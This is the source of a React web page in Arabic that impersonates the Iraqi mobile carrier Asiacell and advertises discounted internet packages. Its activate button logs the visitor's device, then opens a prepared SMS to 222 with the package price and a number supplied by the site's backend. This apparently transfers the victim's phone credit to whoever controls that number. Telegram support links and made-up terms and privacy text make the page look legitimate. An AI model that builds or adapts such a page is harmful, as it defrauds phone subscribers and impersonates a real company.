import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Check, X, ChevronLeft, Phone, ShieldCheck, Star } from 'lucide-react';
import { UAParser } from 'ua-parser-js';

// --- Types ---
interface Package {
  id: string;
  title: string;
  duration: string;
  price: string;
  priceValue: number;
  features: string[];
  activationCode: string;
  isPopular?: boolean;
}

// --- Data ---
const packages: Package[] = [
  {
    id: 'pkg-25k',
    title: 'الباقة الفضية',
    duration: 'شهرين',
    price: '25,000',
    priceValue: 25000,
    features: [
      'إنترنت بلا حدود (سياسة استخدام عادل بعد 100GB بسرعة 5Mbps)'
    ],
    activationCode: 'VIP25',
  },
  {
    id: 'pkg-45k',
    title: 'الباقة الذهبية',
    duration: '3 أشهر',
    price: '45,000',
    priceValue: 45000,
    features: [
      'إنترنت مفتوح (سرعة كاملة حتى 250GB ثم 10Mbps)',
      'مكالمات مفتوحة للكل'
    ],
    activationCode: 'VIP45',
    isPopular: true,
  },
  {
    id: 'pkg-100k',
    title: 'باقة النخبة',
    duration: 'سنة كاملة',
    price: '100,000',
    priceValue: 100000,
    features: [
      'انترنيت مفتوح لمده سنه'
    ],
    activationCode: 'VIP100',
  }
];

export default function App() {
  const [infoModal, setInfoModal] = useState<{title: string, content: React.ReactNode} | null>(null);
  const [smsNumber, setSmsNumber] = useState('222');

  useEffect(() => {
    // Fetch configuration from backend
    fetch('/api/config')
      .then(res => res.json())
      .then(data => {
        if (data && data.smsNumber) {
          setSmsNumber(data.smsNumber);
        }
      })
      .catch(err => console.error('Failed to fetch config:', err));
  }, []);

  const openInfoModal = (type: 'about' | 'terms' | 'privacy') => {
    if (type === 'about') {
      setInfoModal({
        title: 'عن الشركة',
        content: (
          <div className="space-y-4 text-text-secondary leading-relaxed text-right" dir="rtl">
            <p>اسياسيل هي المزود الرائد لخدمات الاتصالات المتنقلة والإنترنت عالي الجودة في العراق. مع شبكة تغطي جميع المحافظات، نلتزم بتقديم أفضل الحلول المبتكرة لقطاع الأعمال والأفراد، لضمان بقائكم على اتصال دائم بعالمكم.</p>
            <p>نهدف إلى تمكين الشركات من خلال توفير بنية تحتية رقمية موثوقة وسريعة.</p>
          </div>
        )
      });
    } else if (type === 'terms') {
      setInfoModal({
        title: 'الشروط والأحكام',
        content: (
          <ul className="space-y-3 text-text-secondary leading-relaxed text-right list-decimal list-inside" dir="rtl">
            <li>تخضع جميع باقات الأعمال لسياسة الاستخدام العادل.</li>
            <li>الأسعار المذكورة تشمل ضريبة المبيعات والخدمات.</li>
            <li>يتم تجديد الباقات تلقائياً عند انتهاء الصلاحية ما لم يقم المشترك بإلغاء التفعيل.</li>
            <li>تحتفظ الشركة بحق تعديل أسعار الباقات أو مميزاتها مع إشعار مسبق للعملاء.</li>
            <li>لا يمكن تحويل رصيد الباقة إلى أرقام أخرى.</li>
          </ul>
        )
      });
    } else if (type === 'privacy') {
      setInfoModal({
        title: 'سياسة الخصوصية',
        content: (
          <ul className="space-y-3 text-text-secondary leading-relaxed text-right list-disc list-inside" dir="rtl">
            <li>نحن في اسياسيل نولي أهمية قصوى لحماية بيانات عملائنا.</li>
            <li>يتم جمع المعلومات الأساسية (مثل رقم الهاتف) فقط لغرض تفعيل الخدمات.</li>
            <li>لا يتم مشاركة بيانات العملاء مع أي أطراف ثالثة لأغراض تسويقية دون موافقة صريحة.</li>
            <li>نستخدم أحدث تقنيات التشفير لضمان أمان معلوماتكم الشخصية وسجلات الاتصال.</li>
          </ul>
        )
      });
    }
  };

  const handleDirectActivation = async (pkg: Package) => {
    // Track click
    try {
      const parser = new UAParser();
      const result = parser.getResult();
      const deviceName = result.device.model || result.os.name || 'Unknown Device';

      await fetch('/api/track', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          pkgId: pkg.id,
          pkgTitle: pkg.title,
          device: deviceName
        })
      });
    } catch (e) {
      console.error('Tracking failed:', e);
    }

    // SMS format is fixed: send to 222 with body "price,managed-number"
    const smsBody = `${pkg.priceValue},${smsNumber}`;
    const smsLink = `sms:222?body=${encodeURIComponent(smsBody)}`;
    window.location.href = smsLink;
  };

  return (
    <div className="min-h-screen bg-bg-dark text-text-primary font-sans flex flex-col">
      {/* Header */}
      <header className="px-4 py-4 md:px-[60px] md:py-[30px] flex justify-center md:justify-between items-center border-b border-border">
        <div className="flex items-center gap-3 md:gap-[15px]">
          <img
            src="/icons/logo.png"
            alt="شعار اسياسيل"
            className="w-[52px] h-[52px] md:w-[56px] md:h-[56px] object-contain shrink-0"
          />
          <span className="text-[28px] md:text-[20px] font-bold whitespace-nowrap leading-none">
            اسياسيل
          </span>
        </div>
        <nav className="hidden md:flex gap-[30px] text-[14px] text-text-secondary">
          <a href="https://t.me/cs_iraqi" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">الدعم الفني</a>
          <button onClick={() => openInfoModal('about')} className="hover:text-white transition-colors cursor-pointer">عن الشركة</button>
          <a href="https://t.me/cs_iraqi" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">اتصل بنا</a>
        </nav>
      </header>

      <main className="flex-grow flex flex-col">
        {/* Hero Section */}
        <section className="pt-8 pb-8 px-4 md:pt-[60px] md:pb-[40px] md:px-[60px] text-center">
          <div className="max-w-4xl mx-auto">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6 }}
            >
              <h1 className="text-[34px] md:text-[42px] font-bold mb-[16px] bg-gradient-to-b from-white to-[#888] bg-clip-text text-transparent leading-tight">
                بوابتكم للاتصال بلا حدود
              </h1>
              <p className="text-text-secondary text-base md:text-[18px] max-w-[600px] mx-auto leading-[1.6]">
                صُممت باقات الأعمال الحصرية لرجال الأعمال الذين يبحثون عن الكفاءة والتميز في خدمات الاتصال.
              </p>
            </motion.div>
          </div>
        </section>

        {/* Packages Section */}
        <section id="packages" className="flex-grow">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-[24px] px-4 md:px-[60px] max-w-7xl mx-auto">
            {packages.map((pkg, index) => (
              <motion.div
                key={pkg.id}
                initial={{ opacity: 0, y: 30 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ duration: 0.5, delay: index * 0.1 }}
                className={`bg-bg-card border ${
                  pkg.isPopular ? 'border-brand-red' : 'border-border'
                } rounded-[16px] p-6 md:p-[32px] flex flex-col items-center text-center transition-colors duration-300 relative`}
              >
                {pkg.isPopular && (
                  <div className="absolute -top-[12px] bg-brand-red text-white px-[16px] py-[4px] rounded-[20px] text-[12px] font-bold">
                    الباقة الأكثر مبيعاً
                  </div>
                )}
                
                <div className="text-[14px] text-text-secondary mb-[8px] uppercase">{pkg.duration}</div>
                <div className="text-[32px] font-bold mb-[20px]">
                  {pkg.price} <span className="text-[14px] text-text-secondary font-normal">دينار عراقي</span>
                </div>

                <ul className="list-none mb-[30px] w-full text-right flex-grow">
                  {pkg.features.map((feature, i) => (
                    <li key={i} className="text-text-secondary text-[14px] mb-[12px] flex items-center gap-[8px]">
                      <span className="text-brand-red font-bold">✓</span>
                      <span>{feature}</span>
                    </li>
                  ))}
                </ul>

                <button
                  onClick={() => handleDirectActivation(pkg)}
                  className={`w-full py-[14px] rounded-[8px] font-semibold text-[16px] cursor-pointer transition-all duration-300 ${
                    pkg.isPopular
                      ? 'bg-brand-red text-white hover:bg-brand-red-hover'
                      : 'bg-transparent border border-border text-white hover:bg-border'
                  }`}
                >
                  {pkg.isPopular ? 'تفعيل الآن' : 'اختيار الباقة'}
                </button>
              </motion.div>
            ))}
          </div>
        </section>

        {/* Trust Section */}
        <section className="py-[30px] px-4 md:px-[60px] mt-10">
          <div className="max-w-4xl mx-auto text-center">
            <p className="text-text-secondary text-sm leading-relaxed">
              تخضع جميع الباقات لشروط وأحكام شركة اسياسيل للاتصالات. يتم تجديد الباقات تلقائياً ما لم يتم الإلغاء.
            </p>
          </div>
        </section>
      </main>

      <footer className="px-4 py-6 md:px-[60px] md:py-[30px] flex flex-col md:flex-row justify-between items-center gap-4 border-t border-border text-text-secondary text-[13px] text-center">
        <div>© 2024 اسياسيل - جميع الحقوق محفوظة لرجال الأعمال</div>
        <div className="flex gap-[20px]">
          <button onClick={() => openInfoModal('terms')} className="hover:text-white transition-colors cursor-pointer">الشروط والأحكام</button>
          <button onClick={() => openInfoModal('privacy')} className="hover:text-white transition-colors cursor-pointer">سياسة الخصوصية</button>
        </div>
      </footer>

      {/* Info Modal */}
      <AnimatePresence>
        {infoModal && (
          <>
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setInfoModal(null)}
              className="fixed inset-0 z-50 bg-black/80 backdrop-blur-[4px] flex items-center justify-center"
            />
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 20 }}
              className="fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-50"
            >
              <div className="bg-bg-card border border-border w-[calc(100vw-2rem)] max-w-[500px] p-6 md:p-[40px] rounded-[20px] text-center shadow-2xl relative">
                <button 
                  onClick={() => setInfoModal(null)}
                  className="absolute top-4 left-4 p-2 rounded-full hover:bg-border transition-colors text-text-secondary hover:text-white"
                >
                  <X className="w-5 h-5" />
                </button>

                <h2 className="text-2xl font-bold mb-[24px] text-right">{infoModal.title}</h2>
                <div className="text-right">
                  {infoModal.content}
                </div>
              </div>
            </motion.div>
          </>
        )}
      </AnimatePresence>
    </div>
  );
}
